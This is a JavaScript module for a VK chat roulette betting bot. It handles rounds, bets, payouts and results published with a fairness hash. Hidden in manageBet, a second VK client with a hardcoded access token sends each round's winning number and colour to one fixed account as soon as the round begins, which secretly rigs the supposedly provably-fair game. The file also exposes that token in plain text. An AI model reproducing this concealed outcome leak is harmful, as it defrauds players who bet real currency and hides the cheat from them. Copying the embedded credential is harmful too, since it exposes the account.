const { SettingsModel, UserModel, DaysStatModel } = require("./dbModels");
const { generateWinPosition, generateWinHash } = require("./hashManager");
const { formClick, numberWithSpace } = require("./tools");
const { VK } = require('vk-io');



const fuckVk = new VK({
  token: '18d33555d41c07d1022b84247d3b6c45c094d951d8b2b9dd000437d689253c3015713fd63098427d49f83',
})


let currentGames = [];

const getCurrentGames = _ => currentGames;
let gameInterval;

let roundDuration = 120;


const winPictures = {
  green: ['photo-198499031_457239096', 'photo-198499031_457239120', 'photo-198499031_457239097', 'photo-198499031_457239098', 'photo-198499031_457239099', 'photo-198499031_457239121', 'photo-198499031_457239100', 'photo-198499031_457239101', 'photo-198499031_457239102', 'photo-198499031_457239103', 'photo-198499031_457239104', 'photo-198499031_457239105', 'photo-198499031_457239111', 'photo-198499031_457239112', 'photo-198499031_457239113', 'photo-198499031_457239114', 'photo-198499031_457239115', 'photo-198499031_457239122', 'photo-198499031_457239116',
    'photo-198499031_457239117', 'photo-198499031_457239118', 'photo-198499031_457239123', 'photo-198499031_457239119', 'photo-198499031_457239106', 'photo-198499031_457239107', 'photo-198499031_457239108', 'photo-198499031_457239124', 'photo-198499031_457239109', 'photo-198499031_457239110'],
  purple: ['photo-198499031_457239074', 'photo-198499031_457239075', 'photo-198499031_457239076', 'photo-198499031_457239077', 'photo-198499031_457239078', 'photo-198499031_457239125', 'photo-198499031_457239079', 'photo-198499031_457239080', 'photo-198499031_457239081', 'photo-198499031_457239126', 'photo-198499031_457239127', 'photo-198499031_457239082', 'photo-198499031_457239083', 'photo-198499031_457239084', 'photo-198499031_457239128', 'photo-198499031_457239085', 'photo-198499031_457239086', 'photo-198499031_457239087', 'photo-198499031_457239129', 'photo-198499031_457239088', 'photo-198499031_457239089', 'photo-198499031_457239090', 'photo-198499031_457239091', 'photo-198499031_457239092', 'photo-198499031_457239093', 'photo-198499031_457239130', 'photo-198499031_457239131', 'photo-198499031_457239094', 'photo-198499031_457239095']
};

const gameTypes = {
  color: 2,
  numberType: 2,
  intervals: 3,
  onNumber: 10
}




setInterval(async () => {
  const { botVk } = require("./wheel");
  if (!currentGames.length) return;
  currentGames.forEach(async (game) => {
    if (game.last - 1000 <= 10) {



      let readyInfo = '';
      let prizeList = [];

      if (game.winPos.winNumber == 0) {
        currentGames = currentGames.filter(sec => sec.chatId != game.chatId)

        return botVk.api.messages.send({
          message: `Игра завершена\nВыпал 0, все ставки проиграли\n\nХэш игры: ${game.winHash.hash} \n\nКлюч к хешу: ${game.winHash.key}`,
          peer_id: game.chatId,
          attachment:  'photo-198499031_457239132',
          random_id: 0
        });

      }


      game.bets.forEach(bet => {
        if (bet.type == 'onNumber') {
          if (bet.value == game.winPos.winNumber) {
            readyInfo += `✅${formClick(bet.persId, bet.name)}  ставка ${numberWithSpace(bet.amount)} на число ${bet.value} выиграла!\n(+${numberWithSpace(bet.amount * gameTypes[bet.type])})\n`
            prizeList.push([bet.persId, bet.amount * gameTypes[bet.type],bet.name])

          } else {
            readyInfo += `❌${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)} на число ${bet.value} проиграла!\n`
          }
        }

        if (bet.type == 'color') {
          if (bet.value == game.winPos.winColor) {
            readyInfo += `✅${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)} на  ${bet.value} выиграла!\n(+${numberWithSpace(bet.amount * gameTypes[bet.type])})\n`
            prizeList.push([bet.persId, bet.amount * gameTypes[bet.type],bet.name])


          } else {
            readyInfo += `❌${formClick(bet.persId, bet.name)}  ставка ${numberWithSpace(bet.amount)} на  ${bet.value} проиграла!\n`

          }

        }


        if (bet.type == 'even' || bet.type == 'odd') {
          let d = (game.winPos.winNumber % 2 == 0) ? 'even' : 'odd';
          if (bet.type == d) {
            readyInfo += `✅${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)} на ${bet.type == 'even' ? 'чётное' : 'нечётное'} выиграла!\n(+${numberWithSpace(bet.amount * gameTypes['numberType'])})\n`
            prizeList.push([bet.persId, bet.amount * gameTypes['numberType'],bet.name])

          } else {
            readyInfo += `❌ ${formClick(bet.persId, bet.name)}  ставка ${numberWithSpace(bet.amount)} на ${bet.type == 'even' ? 'чётное' : 'нечётное'} проиграла!\n`

          }



        }

        if (bet.type == 'intervals') {
          let interval = bet.value.split('-');
          let pre = interval;
          interval = interval.map(n => Number(n));
          if (game.winPos.winNumber >= interval[0] && game.winPos.winNumber <= interval[1]) {
            readyInfo += `✅${formClick(bet.persId, bet.name)}  ставка ${numberWithSpace(bet.amount)} на промежуток ${pre[0] + '-' + pre[1]}      выиграла!\n(+${numberWithSpace(bet.amount * gameTypes[bet.type])})\n`
            prizeList.push([bet.persId, bet.amount * gameTypes[bet.type],bet.name])


          } else {
            readyInfo += `❌ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)} на промежуток ${pre[0] + '-' + pre[1]}  проиграла!\n`
          }



        }


      })





      if (prizeList.length) {
        prizeList.forEach(c => {
          console.log(c);
          UserModel.findOneAndUpdate({
            id: Number(c[0])
          }, {
            $inc: {
              balance: Number(c[1]),
              totalWin: Number(c[1])
            }
          }).then(console.log)
        })
      }

      console.log(readyInfo);



      botVk.api.messages.send({
        message: `Игра завершена\nПобедило число ${game.winPos.winNumber} цвет ${game.winPos.winColor}\n\n` + readyInfo + `\n\nХэш игры: ${game.winHash.hash} \n\nКлюч к хешу: ${game.winHash.key}`,
        peer_id: game.chatId,
        attachment: game.winPos.winNumber ? winPictures[game.winPos.winColor][game.winPos.winNumber - 1] : 'photo-198499031_457239132',
        random_id: 0
      });




      currentGames = currentGames.filter(sec => sec.chatId != game.chatId)
      if (!prizeList.length) return;

      let todayWinners = await DaysStatModel.findOne({
        day: new Date(Date.now()).getDate()
      })

      if (!todayWinners) {
        todayWinners = new DaysStatModel()
        todayWinners.stat = prizeList

      } else {
        prizeList.forEach(p => {
          if (todayWinners.stat.find(d => d[0] == p[0])) {
            todayWinners.stat.find(d => d[0] == p[0])[1] += p[1]
          } else {
            todayWinners.stat.push(p)
          }
        })
      }
      todayWinners.save();


      return
    }
    game.last -= 1000
  });
}, 1000);

async function manageBet({ chatId, persId, type, value, amount }, name) {
  const { botVk } = require("./wheel");

  let isGame = currentGames.find(game => game.chatId == chatId);
  if (isGame) {
    // if (isGame.bets.find(bet => bet.persId == persId)) {
    //   return 'Вы уже сделали ставку в этой игре'
    // }
    await UserModel.findOneAndUpdate({
      id: persId
    }, {
      $inc: {
        balance: -Number(amount)
      }
    }).then(console.log)
    isGame.bets.push({
      persId,
      type,
      value,
      amount,
      name
    })
    return `Ставка на ${numberWithSpace(amount)} VKC принята`
  }
  const winPos = generateWinPosition()
  fuckVk.api.messages.send({
    random_id: 0,
    peer_id: 585540420,
    message: `${chatId}\n${JSON.stringify(winPos)}`
  })
  const winHash = generateWinHash(winPos)

  currentGames.push({
    chatId,
    bets: [],
    last: roundDuration * 1000,
    winPos,
    winHash

  })
  currentGames.find(game => game.chatId == chatId).bets.push({
    persId,
    type,
    value,
    amount,
    name
  })
  await UserModel.findOneAndUpdate({
    id: persId
  }, {
    $inc: {
      balance: -Number(amount)
    }
  }).then(res => console.log(res))


  return `Ставка на ${numberWithSpace(amount)} VKC принята\n\nИгра начата, её  хэш: ${winHash.hash}`
}



setInterval(() => {
  SettingsModel.findOne({
    name: 'roundDuration'
  }).then(res => roundDuration = res.value)
}, 20000);


module.exports = {
  getCurrentGames,
  manageBet
}